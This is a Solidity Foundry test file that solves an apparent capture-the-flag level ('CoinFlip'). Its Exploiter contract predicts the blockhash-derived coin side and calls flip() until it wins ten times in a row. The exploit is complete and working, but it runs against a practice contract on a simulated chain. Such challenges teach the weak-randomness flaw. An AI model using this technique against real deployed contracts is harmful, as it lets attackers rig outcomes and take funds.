pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/04.sol";

contract Exploiter {
    uint256 consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {}

    function exploit(CoinFlip instance) external returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            return 0;
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool returned = instance.flip(side);
        if(returned) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }

        return consecutiveWins;
    }

    receive() external payable { }
}

contract Test04 is Test {

    CoinFlip instance;
    
    function setUp() public {
        instance = new CoinFlip();
    }

    function testSolve() public {
        vm.roll(1000);
        Exploiter exploiter = new Exploiter();
        uint256 consecutiveWins;
        for(uint i = 0; i < 20; i++) {
            // Simulates transactions on chain
            vm.roll(block.number + i);
            
            consecutiveWins = exploiter.exploit(instance);
            if(consecutiveWins == 10) {
                break;
            }
        }
        
        uint contractWins = instance.consecutiveWins();

        assertEq(contractWins, 10);
    }


}